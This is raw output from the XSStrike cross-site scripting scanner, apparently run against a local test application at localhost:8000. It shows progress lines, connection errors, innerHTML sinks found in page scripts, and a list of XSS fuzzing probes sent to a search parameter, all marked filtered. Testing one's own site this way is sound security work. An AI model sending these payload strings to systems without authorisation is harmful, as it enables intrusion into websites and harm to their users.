 Progress: 1312/1536  Progress: 1313/1536  Progress: 1314/1536  Progress: 1315/1536  Progress: 1316/1536  Progress: 1317/1536  Progress: 1318/1536  Progress: 1319/1536  Progress: 1320/1536  Progress: 1321/1536  Progress: 1322/1536  Progress: 1323/1536  Progress: 1324/1536  Progress: 1325/1536  Progress: 1326/1536  Progress: 1327/1536  Progress: 1328/1536  Progress: 1329/1536  Progress: 1330/1536  Progress: 1331/1536  Progress: 1332/1536  Progress: 1333/1536  Progress: 1334/1536  Progress: 1335/1536  Progress: 1336/1536 [!!] Unable to connect to the target. 
 Progress: 1337/1536  Progress: 1338/1536  Progress: 1339/1536 [!!] Unable to connect to the target. 
 Progress: 1340/1536 [!!] Unable to connect to the target. 
 Progress: 1341/1536  Progress: 1342/1536  Progress: 1343/1536  Progress: 1344/1536  Progress: 1345/1536  Progress: 1346/1536  Progress: 1347/1536  Progress: 1348/1536  Progress: 1349/1536  Progress: 1350/1536  Progress: 1351/1536  Progress: 1352/1536  Progress: 1353/1536  Progress: 1354/1536  Progress: 1355/1536  Progress: 1356/1536  Progress: 1357/1536  Progress: 1358/1536  Progress: 1359/1536  Progress: 1360/1536  Progress: 1361/1536 [!!] Unable to connect to the target. 
 Progress: 1362/1536  Progress: 1363/1536  Progress: 1364/1536  Progress: 1365/1536  Progress: 1366/1536  Progress: 1367/1536  Progress: 1368/1536  Progress: 1369/1536  Progress: 1370/1536  Progress: 1371/1536  Progress: 1372/1536  Progress: 1373/1536 [!!] Unable to connect to the target. 
 Progress: 1374/1536 [!!] Unable to connect to the target. 
 Progress: 1375/1536  Progress: 1376/1536  Progress: 1377/1536  Progress: 1378/1536  Progress: 1379/1536  Progress: 1380/1536  Progress: 1381/1536  Progress: 1382/1536  Progress: 1383/1536  Progress: 1384/1536  Progress: 1385/1536  Progress: 1386/1536  Progress: 1387/1536  Progress: 1388/1536  Progress: 1389/1536  Progress: 1390/1536  Progress: 1391/1536 [!!] Unable to connect to the target. 
 Progress: 1392/1536 [!!] Unable to connect to the target. 
 Progress: 1393/1536  Progress: 1394/1536  Progress: 1395/1536  Progress: 1396/1536  Progress: 1397/1536  Progress: 1398/1536  Progress: 1399/1536  Progress: 1400/1536  Progress: 1401/1536  Progress: 1402/1536  Progress: 1403/1536  Progress: 1404/1536  Progress: 1405/1536  Progress: 1406/1536  Progress: 1407/1536  Progress: 1408/1536  Progress: 1409/1536  Progress: 1410/1536  Progress: 1411/1536  Progress: 1412/1536  Progress: 1413/1536  Progress: 1414/1536  Progress: 1415/1536 [!!] Unable to connect to the target. 
 Progress: 1416/1536  Progress: 1417/1536  Progress: 1418/1536  Progress: 1419/1536  Progress: 1420/1536  Progress: 1421/1536 [!!] Unable to connect to the target. 
 Progress: 1422/1536  Progress: 1423/1536  Progress: 1424/1536  Progress: 1425/1536  Progress: 1426/1536  Progress: 1427/1536  Progress: 1428/1536  Progress: 1429/1536  Progress: 1430/1536  Progress: 1431/1536  Progress: 1432/1536  Progress: 1433/1536  Progress: 1434/1536  Progress: 1435/1536 [!!] Unable to connect to the target. 
 Progress: 1436/1536  Progress: 1437/1536  Progress: 1438/1536  Progress: 1439/1536  Progress: 1440/1536  Progress: 1441/1536  Progress: 1442/1536  Progress: 1443/1536  Progress: 1444/1536  Progress: 1445/1536  Progress: 1446/1536  Progress: 1447/1536  Progress: 1448/1536  Progress: 1449/1536  Progress: 1450/1536  Progress: 1451/1536 [!!] Unable to connect to the target. 
 Progress: 1452/1536  Progress: 1453/1536  Progress: 1454/1536  Progress: 1455/1536  Progress: 1456/1536  Progress: 1457/1536  Progress: 1458/1536  Progress: 1459/1536  Progress: 1460/1536  Progress: 1461/1536  Progress: 1462/1536  Progress: 1463/1536  Progress: 1464/1536 [!!] Unable to connect to the target. 
 Progress: 1465/1536  Progress: 1466/1536  Progress: 1467/1536  Progress: 1468/1536  Progress: 1469/1536  Progress: 1470/1536 [!!] Unable to connect to the target. 
 Progress: 1471/1536  Progress: 1472/1536  Progress: 1473/1536  Progress: 1474/1536  Progress: 1475/1536  Progress: 1476/1536  Progress: 1477/1536 [!!] Unable to connect to the target. 
 Progress: 1478/1536  Progress: 1479/1536  Progress: 1480/1536  Progress: 1481/1536  Progress: 1482/1536  Progress: 1483/1536  Progress: 1484/1536  Progress: 1485/1536  Progress: 1486/1536  Progress: 1487/1536  Progress: 1488/1536 [!!] Unable to connect to the target. 
 Progress: 1489/1536 [!!] Unable to connect to the target. 
 Progress: 1490/1536  Progress: 1491/1536  Progress: 1492/1536  Progress: 1493/1536  Progress: 1494/1536  Progress: 1495/1536  Progress: 1496/1536  Progress: 1497/1536  Progress: 1498/1536 [!!] Unable to connect to the target. 
 Progress: 1499/1536  Progress: 1500/1536  Progress: 1501/1536  Progress: 1502/1536  Progress: 1503/1536  Progress: 1504/1536  Progress: 1505/1536  Progress: 1506/1536  Progress: 1507/1536  Progress: 1508/1536 [!!] Unable to connect to the target. 
 Progress: 1509/1536  Progress: 1510/1536  Progress: 1511/1536  Progress: 1512/1536  Progress: 1513/1536  Progress: 1514/1536  Progress: 1515/1536  Progress: 1516/1536  Progress: 1517/1536 [!!] Unable to connect to the target. 
 Progress: 1518/1536  Progress: 1519/1536  Progress: 1520/1536  Progress: 1521/1536  Progress: 1522/1536 [!!] Unable to connect to the target. 
 Progress: 1523/1536  Progress: 1524/1536  Progress: 1525/1536  Progress: 1526/1536  Progress: 1527/1536  Progress: 1528/1536  Progress: 1529/1536  Progress: 1530/1536  Progress: 1531/1536  Progress: 1532/1536  Progress: 1533/1536  Progress: 1534/1536  Progress: 1535/1536  Progress: 1536/1536 
### Test 3: Commentaires 

	XSStrike v3.1.5

 Crawling the target 
 Parsing hebergement/1                             Potentially vulnerable objects found at http://localhost:8000/hebergement/1 
------------------------------------------------------------
64  *tabNavigationItem.innerHTML* = tabTitle;
168 *toggle.innerHTML* = currentContent !== altContent ? altContent : originalContent;
223 *option.innerHTML* = '<em>(none)</em>';
------------------------------------------------------------
 Parsing                                          ------------------------------------------------------------
 Vulnerable component: bootstrap v5.0.2 
 Component location: https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js 
 Total vulnerabilities: 0 
------------------------------------------------------------
 Progress: 2/2 
### Test 4: Recherche 

	XSStrike v3.1.5

 WAF Status: Offline 
 Fuzzing parameter: search 
 [filtered] <test 
 [filtered] <test// 
 [filtered] <test> 
 [filtered] <test x> 
 [filtered] <test x=y 
 [filtered] <test x=y// 
 [filtered] <test/oNxX=yYy// 
 [filtered] <test oNxX=yYy> 
 [filtered] <test onload=x 
 [filtered] <test/o%00nload=x 
 [filtered] <test sRc=xxx 
 [filtered] <test data=asa 
 [filtered] <test data=javascript:asa 
 [filtered] <svg x=y> 
 [filtered] <details x=y// 
 [filtered] <a href=x// 
 [filtered] <emBed x=y> 
 [filtered] <object x=y// 
 [filtered] <bGsOund sRc=x> 
 [filtered] <iSinDEx x=y// 
 [filtered] <aUdio x=y> 
 [filtered] <script x=y> 
 [filtered] <script//src=// 
 [filtered] ">payload<br/attr=" 
 [filtered] "-confirm``-" 
 [filtered] <test ONdBlcLicK=x> 
 [filtered] <test/oNcoNTeXtMenU=x> 
 [filtered] <test OndRAgOvEr=x> 
